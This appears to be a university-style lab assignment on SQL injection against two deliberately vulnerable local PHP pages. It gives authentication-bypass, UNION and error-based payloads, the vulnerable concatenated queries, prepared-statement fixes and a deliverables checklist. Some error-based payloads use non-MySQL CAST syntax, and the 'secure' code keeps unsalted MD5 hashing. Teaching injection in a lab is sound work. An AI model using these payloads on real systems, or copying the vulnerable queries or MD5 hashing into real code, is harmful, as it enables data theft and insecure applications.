# SQL Injection Attack Documentation Framework

## Lab Assignment: Advanced SQL Injection Techniques

### Target Applications:
- **login.php**: Vulnerable POST-based login form
- **products.php**: Vulnerable GET-based product lookup

---

## Attack Type 1: In-Band SQL Injection (login.php)

### Objective:
Bypass authentication using basic SQL injection techniques

### Target Query:
```php
$sql = "SELECT username, role, secret_flag FROM users WHERE username = '$username' AND password_hash = MD5('$password')";
```

### Attack Payloads to Test:

#### 1.1 Basic Authentication Bypass
**Username:** `admin' --`
**Password:** `anything`

**Resulting Query:**
```sql
SELECT username, role, secret_flag FROM users WHERE username = 'admin' -- ' AND password_hash = MD5('anything')
```

#### 1.2 OR-based Bypass
**Username:** `' OR '1'='1`
**Password:** `anything`

**Resulting Query:**
```sql
SELECT username, role, secret_flag FROM users WHERE username = '' OR '1'='1' AND password_hash = MD5('anything')
```

#### 1.3 UNION-based Information Extraction
**Username:** `' UNION SELECT username, role, secret_flag FROM users WHERE role='admin' --`
**Password:** `anything`

### Documentation Template:
```
Attack: [Attack Name]
Payload: [Exact payload used]
Result: [Screenshot/Description of result]
Flag Retrieved: [Any flags obtained]
Analysis: [Explanation of why attack worked]
```

---

## Attack Type 2: Union-Based SQL Injection (products.php)

### Objective:
Extract sensitive data from other tables using UNION SELECT

### Target Query:
```php
$sql = "SELECT name, price FROM products WHERE product_id = '$product_id'";
```

### Column Count Discovery:
**Test URL:** `http://localhost/sqli_lab/products.php?id=101' ORDER BY 1--`
**Test URL:** `http://localhost/sqli_lab/products.php?id=101' ORDER BY 2--`
**Test URL:** `http://localhost/sqli_lab/products.php?id=101' ORDER BY 3--`

### Attack Payloads to Test:

#### 2.1 Basic UNION Attack
**URL:** `http://localhost/sqli_lab/products.php?id=101' UNION SELECT 'test1', 'test2'--`

#### 2.2 Extract Users Table
**URL:** `http://localhost/sqli_lab/products.php?id=101' UNION SELECT username, secret_flag FROM users--`

#### 2.3 Extract Admin Credentials
**URL:** `http://localhost/sqli_lab/products.php?id=101' UNION SELECT username, secret_flag FROM users WHERE role='admin'--`

#### 2.4 Database Schema Discovery
**URL:** `http://localhost/sqli_lab/products.php?id=101' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema='assignment_db'--`

---

## Attack Type 3: Error-Based SQL Injection (login.php with errors enabled)

### Setup Required:
Uncomment the error reporting line in login.php:
```php
$message = "Login Failed. MySQL Error: " . $conn->error;
```

### Objective:
Extract information through MySQL error messages

### Attack Payloads to Test:

#### 3.1 Extractversion Information
**Username:** `' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 AND 1=CAST((SELECT version()) AS INT) --`

#### 3.2 Extract Database Name
**Username:** `' AND 1=CAST((SELECT database()) AS INT) --`

#### 3.3 Extract Table Names
**Username:** `' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) AS INT) --`

#### 3.4 Extract Column Names
**Username:** `' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS INT) --`

#### 3.5 Extract Sensitive Data
**Username:** `' AND 1=CAST((SELECT secret_flag FROM users WHERE role='admin' LIMIT 1) AS INT) --`

---

## Defense Implementation

### Secure Code Examples:

#### Prepared Statements (login.php):
```php
$stmt = $conn->prepare("SELECT username, role, secret_flag FROM users WHERE username = ? AND password_hash = MD5(?)");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

#### Prepared Statements (products.php):
```php
$stmt = $conn->prepare("SELECT name, price FROM products WHERE product_id = ?");
$stmt->bind_param("i", $product_id);
$stmt->execute();
$result = $stmt->get_result();
```

---

## Lab Deliverables Checklist:

### Setup Confirmation:
- [ ] login.php accessible with successful alice/password login
- [ ] products.php accessible showing Secure Firewall details
- [ ] Screenshots of both working applications

### Attack Documentation:
- [ ] In-Band SQL injection successful bypass
- [ ] Union-based data extraction completed
- [ ] Error-based information disclosure documented
- [ ] All attack payloads and results documented

### Defense Implementation:
- [ ] Secure versions of both files created
- [ ] Prepared statements implemented
- [ ] Testing confirms vulnerabilities are patched

---

## Common SQL Injection Prevention Techniques:

1. **Prepared Statements / Parameterized Queries**
2. **Input Validation and Sanitization**
3. **Least Privilege Database Access**
4. **Error Message Handling**
5. **Web Application Firewalls (WAF)**

Remember to document each attack with:
- Exact payload used
- Screenshot of result
- Explanation of the technique
- Impact assessment